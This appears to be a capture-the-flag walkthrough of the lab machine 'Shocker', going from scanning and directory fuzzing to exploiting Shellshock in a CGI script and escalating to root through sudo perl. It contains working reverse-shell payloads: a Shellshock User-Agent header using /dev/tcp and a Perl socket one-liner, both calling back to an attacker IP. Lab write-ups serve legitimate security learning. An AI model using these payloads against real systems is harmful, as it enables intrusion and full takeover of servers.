
# Connect to the machine 

use openvpn or another vpn to connect to the machine as follows 

```shell
openvpn lab_acountname.ovpn
```

after that try to ping the machine to make sure you are connected 


```shell
ping 10.10.10.56
```

if you get response then we are ready to enumerate


# Recon

 using Nmap with default scripts with default scripts and with services versions

```shell
nmap -sV -sC 10.10.10.56
```


which results to 

```shell

Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 01:58 EDT
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
```


to summery this result we have 2 ports open :

1. 80/http
2. 2222/ssh


OS : **Linux**

**Versions**
Apache httpd 2.4.18
OpenSSH 7.2p2



# Enumeration


## Checking Versions


### Apache httpd 2.4.18

using searchsploit :

```shell 
searchsploit Apache 2.4.18

->
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Executi | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Sca | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Lo | linux/local/46676.php
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak              | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service           | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer O | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Tra | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing             | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal           | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)     | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8  | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)  | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Re | linux/remote/34.pl
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

looks like that Apache version is not vulnerable

### OpenSSH 7.2p2

using searchsploit :

```shell 
searchsploit OpenSSH 7.2p2

->
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                               | linux/dos/40888.py
OpenSSH 7.2p2 - Username Enumeration                          | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded U | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading      | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                         | linux/remote/40113.txt
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

This version seems to be vulnerable :)


### Attacking OpenSSH

using the python code provided from last section i tried to enumerate the users against the famous word list rockyou.txt :

```shell 
python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/rockyou.txt 10.10.10.56:2222

->

User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari


Traceback (most recent call last):
  File "/usr/share/exploitdb/exploits/linux/remote/40136.py", line 156, in <module>
    main()
  File "/usr/share/exploitdb/exploits/linux/remote/40136.py", line 103, in main
    users = f.readlines()
            ^^^^^^^^^^^^^
  File "<frozen codecs>", line 322, in decode
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte


```

The machine looks not to be vulnerable to this attack as i got as error running the script.

## checking the http service


```shell
curl http://10.10.10.56  

->
 <!DOCTYPE html>
<html>
<body>

<h2>Don\'t Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html> 

```

nothing looks special .

### Fuzzing the web server for directories

here i used ffuf to fuzz the web server for common directories using the dirb small lowercase wordlist.

```shell
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt  -u http://10.10.10.56/FUZZ/ -ic

->

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 46ms]
    * FUZZ: 

[Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 57ms]
    * FUZZ: cgi-bin

[Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 50ms]
    * FUZZ: icons

[Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 47ms]
    * FUZZ: 

:: Progress: [81630/81630] :: Job [1/1] :: 716 req/sec :: Duration: [0:01:41] :: Errors: 0 ::

```

from the result above we can see 2 directories  with status code 403, which is basicly the access to the directory is forbidden:
1. cgi-bin
2. icons

the cgi-bin directory looks more interesting ,just googling `cgi-bin exploit` landed me in this wonderful page 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

it looks like we should fuzz the web server for a script in the cgi-bin file , if we succeed we should check for the exploit mentioned in the page `ShellShock`

### Fuzzing cgi-bin directory fir script file

searching a bit showed me that this file can have any type of script but most commonly are : .cgi .pl .c .sh .java  , so we fuzz the directory against these extension again using ffuf :

```shell
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt  -u http://10.10.10.56/cgi-bin/FUZZ -e .cgi,.pl,.java,.sh,.c -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
 :: Extensions       : .cgi .pl .java .sh .c 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 90ms]
    * FUZZ: 

[Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 55ms]
    * FUZZ: user.sh

[Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 49ms]
    * FUZZ: 

```

that's wonderful there is a script called user.sh ,lets try curl to check the script :

```shell
curl http://10.10.10.56/cgi-bin/user.sh


->
Content-Type: text/plain

Just an uptime test script

 02:47:21 up 16 min,  0 users,  load average: 0.00, 0.00, 0.00


```

looks like it just contains the linux command `uptime` , nothing special in the file itself

## ShellShock

### Test ShellSchok
using the website mentioned earlier we can Test the web server if it is vulnerable to this attack using Nmap script as follows :

```shell
nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 02:08 EDT
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.047s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

Nmap stated that it is indeed vulnerable to Shellshock.

### Exploiting ShellShock

we can use this Vulnerability to create a reverse shell .

First start a nc listener :

```shell
nc -lvnp 4444 
```

and run this on another tab 

```shell
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.16.2/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

WOW! we landed a reverse shell , using whoami gives us shelly our user name

## Privilege Escalation

trying
```shell
sudo -l

->
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

we can use the programming language perl as root with no password ,just search any perl reverse shell oneliner and start a nc listener as follows 

```shell
nc -nlvp 4242
```

and on another tab the oneliner :
```shell
sudo perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.2:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
<"10.10.16.2:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'  
```
we have a reverse shell ,using whoami returns root.
## Capturing the Flag

searching for .txt files in the root and home directories 

```shell
find /root /home -name "*.txt" 2>/dev/null

->
/root/root.txt
/home/shelly/user.txt
```

grap the flags using the cat command

```shell
cat /home/shelly/user.txt
cat /root/root.txt
```


# Lesson

- Always search the internet when you find a suspicious directory or file name 
- Don't forget to try shellshock when you have a cgi file or directory